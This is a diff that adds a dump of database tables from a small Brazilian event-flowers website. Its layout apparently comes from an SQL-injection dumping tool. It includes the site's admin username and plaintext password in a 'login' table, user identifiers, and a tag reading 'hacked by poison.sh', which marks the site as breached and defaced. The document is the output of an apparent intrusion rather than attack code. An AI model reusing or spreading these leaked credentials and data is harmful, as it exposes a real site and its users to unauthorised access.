+| 787 | 2      | 7         |
+| 788 | 11     | 7         |
+| 789 | 13     | 7         |
+| 790 | 2      | 5         |
+| 791 | 7      | 5         |
+| 792 | 6      | 228       |
+| 793 | 10     | 228       |
+| 794 | 2      | 53        |
+| 795 | 5      | 53        |
+| 796 | 2      | 55        |
+| 797 | 2      | 54        |
+| 798 | 5      | 54        |
+| 799 | 2      | 57        |
+| 800 | 2      | 25        |
+| 801 | 7      | 25        |
+| 802 | 12     | 25        |
+| 803 | 2      | 8         |
+| 804 | 3      | 8         |
+| 805 | 7      | 8         |
+| 806 | 13     | 8         |
+| 807 | 2      | 10        |
+| 808 | 12     | 10        |
+| 809 | 2      | 9         |
+| 810 | 3      | 9         |
+| 811 | 5      | 9         |
+| 812 | 12     | 9         |
+| 813 | 13     | 9         |
+| 814 | 2      | 11        |
+| 815 | 12     | 11        |
+| 816 | 2      | 12        |
+| 817 | 12     | 12        |
+| 818 | 12     | 244       |
+| 819 | 12     | 76        |
+| 820 | 13     | 251       |
+| 821 | 1      | 252       |
++-----+--------+-----------+
+
+Database: astridde_astrid
+Table: imagem_gostei
+[60 entries]
++----+-----------+-----------------------------------+
+| id | id_imagem | id_usuario                        |
++----+-----------+-----------------------------------+
+| 1  | 114       | 134155814356e6c326d60b31.25940420 |
+| 2  | 116       | 134155814356e6c326d60b31.25940420 |
+| 3  | 18        | 134155814356e6c326d60b31.25940420 |
+| 4  | 42        | 134155814356e6c326d60b31.25940420 |
+| 5  | 67        | 190223752656e6cbb04c7bc1.04649380 |
+| 6  | 11        | 190223752656e6cbb04c7bc1.04649380 |
+| 7  | 70        | 190223752656e6cbb04c7bc1.04649380 |
+| 8  | 75        | 195253517456e6cf183766c7.34837794 |
+| 9  | 87        | 195253517456e6cf183766c7.34837794 |
+| 10 | 91        | 195253517456e6cf183766c7.34837794 |
+| 11 | 7         | 62523102756e6e16a9c4e34.16133647  |
+| 12 | 96        | 62523102756e6e16a9c4e34.16133647  |
+| 13 | 89        | 62523102756e6e16a9c4e34.16133647  |
+| 14 | 18        | 62523102756e6e16a9c4e34.16133647  |
+| 15 | 136       | 62523102756e6e16a9c4e34.16133647  |
+| 16 | 134       | 18484655556e6fe4c650aa1.45963037  |
+| 17 | 10        | 202116898256e7160a254394.16559255 |
+| 18 | 105       | 91073374856e72b33b0ff66.28034541  |
+| 19 | 114       | 60434181356e72c59b3bfa8.95449692  |
+| 20 | 153       | 83645370156e756e25141c4.82163991  |
+| 21 | 148       | 67088619356e75a3a8f9d18.32752918  |
+| 22 | 159       | 49360196456e75c514b7482.55005841  |
+| 23 | 163       | 141172437556e75d275b9d10.85633222 |
+| 24 | 44        | 50287018956e7713772b324.99105900  |
+| 25 | 116       | 43681679856e7a7f8c8e318.83100282  |
+| 26 | 42        | 47749471156e7b62ee4dfc0.86193012  |
+| 27 | 152       | 3874804456e7c321bab015.86996128   |
+| 28 | 146       | 3910750956e7cc5cc35fd5.10607884   |
+| 29 | 8         | 46527756056e7cdfde61630.72810093  |
+| 30 | 75        | 200383643956e7d029c5b537.77015035 |
+| 31 | 52        | 146971473856e7e9aef043a0.59074478 |
+| 32 | 142       | 30470933956e7ecf127ac97.64629522  |
+| 33 | 40        | 98018562556e7f48b0e5ed6.61625307  |
+| 34 | 109       | 106383209256e7f96e1fa3f5.10798036 |
+| 35 | 162       | 157966463956e802a9271d72.02064581 |
+| 36 | 53        | 171429021956e859c498e884.38382290 |
+| 37 | 27        | 137082534756e8803ea5e216.91434324 |
+| 38 | 137       | 115636433556e884dcae3347.51645521 |
+| 39 | 155       | 175712165256e887f0b3e137.96604760 |
+| 40 | 41        | 67564268556e89374128ab3.22784316  |
+| 41 | 29        | 116627692356e8ae4245e815.35784094 |
+| 42 | 111       | 207783468356e8bbab4c1743.11723818 |
+| 43 | 149       | 206160954756e8c36758bf54.64784322 |
+| 44 | 151       | 88689877256e8ca1b642ce9.49948433  |
+| 45 | 83        | 94241258056e8d719b664f5.54710327  |
+| 46 | 157       | 155721307556e8d88b8a3ae0.12084766 |
+| 47 | 158       | 143064211256e8dd2f9522e5.47491956 |
+| 48 | 150       | 105079326056e8e8039b4fc1.09684853 |
+| 49 | 161       | 74665943356e8ea97a0ce84.40101690  |
+| 50 | 156       | 111795709256e914a84f7d86.24065141 |
+| 51 | 164       | 85396612556e918e8544ad1.58392916  |
+| 52 | 160       | 33496351756e924986b16b7.23637082  |
+| 53 | 25        | 100018740056e96018cb3fd0.34376159 |
+| 54 | 73        | 48071732356e96979680689.73471197  |
+| 55 | 127       | 88971875656e99571e68d01.64768183  |
+| 56 | 96        | 108190961956e9e0ae0dfb98.37603875 |
+| 57 | 38        | 81135550256ea2a2b6a7a69.86497035  |
+| 58 | 133       | 77507557056ea2b16718213.36112458  |
+| 59 | 25        | 32206070756eada26ab7bf8.09732751  |
+| 60 | 123       | 16019055856eb6bb0ba63c7.35645170  |
++----+-----------+-----------------------------------+
+
+Database: astridde_astrid
+Table: imagem_local
+[16 entries]
++-----+----------+-----------+
+| id  | id_local | id_imagem |
++-----+----------+-----------+
+| 77  | 11       | 16        |
+| 78  | 11       | 17        |
+| 84  | 11       | 18        |
+| 85  | 11       | 14        |
+| 115 | 11       | 108       |
+| 116 | 11       | 109       |
+| 117 | 11       | 110       |
+| 118 | 11       | 111       |
+| 119 | 11       | 112       |
+| 120 | 11       | 113       |
+| 121 | 11       | 114       |
+| 122 | 11       | 115       |
+| 123 | 11       | 116       |
+| 124 | 11       | 117       |
+| 125 | 11       | 118       |
+| 126 | 12       | 252       |
++-----+----------+-----------+
+
+Database: astridde_astrid
+Table: imagem_segmento
+[181 entries]
++-----+-----------+-------------+------------------------+
+| id  | id_imagem | id_segmento | id_segmento_secundario |
++-----+-----------+-------------+------------------------+
+| 94  | 4         | 1           | 25                     |
+| 96  | 2         | 1           | 24                     |
+| 102 | 19        | 2           | 15                     |
+| 103 | 20        | 2           | 15                     |
+| 104 | 21        | 2           | 15                     |
+| 105 | 23        | 1           | 7                      |
+| 108 | 26        | 1           | 28                     |
+| 113 | 32        | 1           | 30                     |
+| 115 | 34        | 0           | 0                      |
+| 117 | 36        | 1           | 29                     |
+| 119 | 37        | 1           | 29                     |
+| 120 | 38        | 0           | 0                      |
+| 123 | 41        | 1           | 27                     |
+| 127 | 40        | 1           | 11                     |
+| 134 | 45        | 1           | 29                     |
+| 136 | 47        | 1           | 29                     |
+| 137 | 48        | 1           | 25                     |
+| 138 | 49        | 1           | 25                     |
+| 139 | 50        | 1           | 32                     |
+| 148 | 59        | 4           | 47                     |
+| 150 | 61        | 4           | 47                     |
+| 151 | 62        | 4           | 50                     |
+| 156 | 67        | 1           | 28                     |
+| 157 | 68        | 1           | 29                     |
+| 159 | 70        | 1           | 29                     |
+| 160 | 71        | 1           | 29                     |
+| 167 | 73        | 1           | 7                      |
+| 168 | 74        | 1           | 7                      |
+| 169 | 75        | 1           | 7                      |
+| 171 | 77        | 0           | 0                      |
+| 172 | 78        | 0           | 0                      |
+| 173 | 63        | 4           | 45                     |
+| 175 | 66        | 4           | 48                     |
+| 176 | 16        | 4           | 47                     |
+| 177 | 17        | 4           | 47                     |
+| 183 | 18        | 4           | 47                     |
+| 184 | 14        | 4           | 47                     |
+| 185 | 51        | 4           | 47                     |
+| 186 | 52        | 4           | 47                     |
+| 187 | 79        | 3           | 39                     |
+| 188 | 80        | 3           | 39                     |
+| 189 | 81        | 3           | 39                     |
+| 190 | 82        | 3           | 40                     |
+| 191 | 83        | 3           | 41                     |
+| 193 | 85        | 3           | 41                     |
+| 195 | 87        | 3           | 43                     |
+| 197 | 89        | 3           | 44                     |
+| 198 | 90        | 3           | 42                     |
+| 199 | 91        | 3           | 44                     |
+| 200 | 92        | 0           | 0                      |
+| 201 | 93        | 2           | 33                     |
+| 203 | 95        | 2           | 34                     |
+| 204 | 96        | 2           | 33                     |
+| 205 | 97        | 2           | 35                     |
+| 206 | 98        | 2           | 35                     |
+| 207 | 99        | 2           | 35                     |
+| 208 | 100       | 2           | 36                     |
+| 209 | 101       | 2           | 36                     |
+| 212 | 104       | 1           | 7                      |
+| 213 | 105       | 1           | 22                     |
+| 214 | 106       | 1           | 21                     |
+| 215 | 107       | 1           | 21                     |
+| 216 | 108       | 1           | 29                     |
+| 218 | 110       | 1           | 29                     |
+| 220 | 112       | 0           | 0                      |
+| 221 | 113       | 0           | 0                      |
+| 222 | 114       | 1           | 29                     |
+| 224 | 116       | 1           | 28                     |
+| 225 | 117       | 1           | 29                     |
+| 227 | 119       | 0           | 0                      |
+| 229 | 121       | 0           | 0                      |
+| 231 | 123       | 1           | 7                      |
+| 232 | 124       | 0           | 0                      |
+| 233 | 125       | 1           | 29                     |
+| 234 | 126       | 1           | 29                     |
+| 235 | 127       | 0           | 0                      |
+| 236 | 128       | 1           | 29                     |
+| 237 | 129       | 1           | 28                     |
+| 238 | 130       | 1           | 28                     |
+| 239 | 131       | 1           | 24                     |
+| 240 | 132       | 1           | 27                     |
+| 241 | 133       | 0           | 0                      |
+| 243 | 135       | 1           | 24                     |
+| 244 | 136       | 1           | 27                     |
+| 245 | 137       | 1           | 27                     |
+| 247 | 139       | 1           | 28                     |
+| 248 | 140       | 1           | 27                     |
+| 250 | 142       | 1           | 29                     |
+| 252 | 144       | 1           | 28                     |
+| 253 | 145       | 1           | 28                     |
+| 256 | 148       | 1           | 29                     |
+| 257 | 149       | 1           | 28                     |
+| 259 | 151       | 1           | 28                     |
+| 260 | 152       | 0           | 0                      |
+| 263 | 155       | 3           | 40                     |
+| 265 | 157       | 1           | 29                     |
+| 267 | 159       | 1           | 28                     |
+| 272 | 164       | 1           | 7                      |
+| 273 | 165       | 1           | 28                     |
+| 276 | 168       | 1           | 29                     |
+| 277 | 169       | 1           | 30                     |
+| 278 | 170       | 1           | 29                     |
+| 279 | 171       | 1           | 27                     |
+| 294 | 24        | 1           | 28                     |
+| 297 | 179       | 1           | 27                     |
+| 298 | 180       | 1           | 27                     |
+| 300 | 182       | 1           | 27                     |
+| 301 | 183       | 1           | 30                     |
+| 302 | 184       | 1           | 30                     |
+| 303 | 185       | 1           | 29                     |
+| 309 | 191       | 1           | 28                     |
+| 313 | 195       | 1           | 30                     |
+| 314 | 196       | 1           | 27                     |
+| 317 | 65        | 4           | 45                     |
+| 319 | 64        | 4           | 48                     |
+| 320 | 199       | 1           | 27                     |
+| 324 | 203       | 1           | 29                     |
+| 325 | 204       | 1           | 28                     |
+| 327 | 206       | 1           | 30                     |
+| 330 | 209       | 1           | 28                     |
+| 332 | 211       | 1           | 29                     |
+| 333 | 212       | 1           | 31                     |
+| 334 | 213       | 0           | 0                      |
+| 335 | 214       | 0           | 0                      |
+| 336 | 215       | 1           | 22                     |
+| 337 | 216       | 1           | 0                      |
+| 339 | 218       | 1           | 25                     |
+| 340 | 219       | 0           | 0                      |
+| 342 | 221       | 1           | 29                     |
+| 343 | 222       | 1           | 27                     |
+| 345 | 224       | 1           | 32                     |
+| 346 | 225       | 3           | 39                     |
+| 347 | 226       | 3           | 40                     |
+| 351 | 230       | 53          | 0                      |
+| 352 | 231       | 53          | 0                      |
+| 355 | 69        | 1           | 29                     |
+| 356 | 42        | 1           | 28                     |
+| 357 | 27        | 1           | 28                     |
+| 358 | 1         | 1           | 7                      |
+| 359 | 72        | 1           | 27                     |
+| 360 | 43        | 1           | 32                     |
+| 361 | 44        | 1           | 28                     |
+| 362 | 202       | 1           | 27                     |
+| 363 | 166       | 1           | 32                     |
+| 364 | 30        | 1           | 32                     |
+| 365 | 232       | 1           | 25                     |
+| 366 | 233       | 1           | 25                     |
+| 367 | 234       | 1           | 7                      |
+| 368 | 235       | 1           | 28                     |
+| 369 | 236       | 1           | 28                     |
+| 370 | 237       | 1           | 28                     |
+| 376 | 238       | 1           | 28                     |
+| 377 | 239       | 1           | 28                     |
+| 378 | 240       | 1           | 27                     |
+| 379 | 241       | 0           | 0                      |
+| 380 | 242       | 0           | 0                      |
+| 381 | 243       | 0           | 0                      |
+| 382 | 7         | 1           | 22                     |
+| 383 | 5         | 1           | 21                     |
+| 384 | 227       | 53          | 0                      |
+| 385 | 228       | 53          | 0                      |
+| 386 | 53        | 4           | 45                     |
+| 387 | 55        | 4           | 48                     |
+| 388 | 54        | 4           | 50                     |
+| 389 | 57        | 4           | 48                     |
+| 390 | 25        | 3           | 39                     |
+| 391 | 8         | 3           | 17                     |
+| 392 | 10        | 3           | 40                     |
+| 393 | 9         | 3           | 17                     |
+| 394 | 11        | 3           | 40                     |
+| 395 | 12        | 3           | 40                     |
+| 396 | 244       | 0           | 0                      |
+| 397 | 76        | 1           | 7                      |
+| 398 | 245       | 0           | 0                      |
+| 399 | 246       | 0           | 0                      |
+| 400 | 247       | 0           | 0                      |
+| 401 | 248       | 0           | 0                      |
+| 402 | 249       | 0           | 0                      |
+| 403 | 250       | 0           | 0                      |
+| 404 | 251       | 1           | 21                     |
+| 405 | 252       | 0           | 0                      |
++-----+-----------+-------------+------------------------+
+
+Database: astridde_astrid
+Table: imagem_tags
+[2 entries]
++----+--------+-----------+
+| id | id_tag | id_imagem |
++----+--------+-----------+
+| 1  | 1      | 244       |
+| 2  | 2      | 252       |
++----+--------+-----------+
+
+Database: astridde_astrid
+Table: login
+[1 entry]
++----+------------+-------------+
+| id | pass       | user        |
++----+------------+-------------+
+| 1  | astrid1234 | adminastrid |
++----+------------+-------------+
+
+Database: astridde_astrid
+Table: segmentos_principais
+[10 entries]
++----+-------------+------------------+
+| id | id_superior | nome             |
++----+-------------+------------------+
+| 1  | 0           | Casamentos       |
+| 2  | 0           | Formaturas       |
+| 3  | 0           | Aniversários     |
+| 4  | 0           | Corporativos     |
+| 5  | 1           | Cerimônia Igreja |
+| 6  | 1           | Cerimônia Campo  |
+| 7  | 1           | Bouquets         |
+| 8  | 1           | Lapela           |
+| 9  | 1           | Cousarge         |
+| 10 | 1           | Guirlanda        |
++----+-------------+------------------+
+
+Database: astridde_astrid
+Table: slide_home
+[11 entries]
++----+-----------+--------------+-------+
+| id | id_imagem | id_categoria | ordem |
++----+-----------+--------------+-------+
+| 7  | 25        | 3            | 0     |
+| 9  | 76        | 1            | 0     |
+| 12 | 24        | 1            | 0     |
+| 15 | 96        | 2            | 0     |
+| 17 | 21        | 2            | 0     |
+| 18 | 93        | 2            | 0     |
+| 19 | 8         | 3            | 0     |
+| 20 | 225       | 3            | 0     |
+| 22 | 53        | 4            | 0     |
+| 23 | 55        | 4            | 0     |
+| 24 | 62        | 4            | 0     |
++----+-----------+--------------+-------+
+
+Database: astridde_astrid
+Table: tags
+[2 entries]
++----+----------------------+
+| id | nome                 |
++----+----------------------+
+| 1  | marsala              |
+| 2  | hacked by poison.sh  |
++----+----------------------+
+
+Database: astridde_astrid
+Table: visitas
+[1 entry]
++-----------+
+| vis_total |
++-----------+
+| 29829     |
++-----------+
+
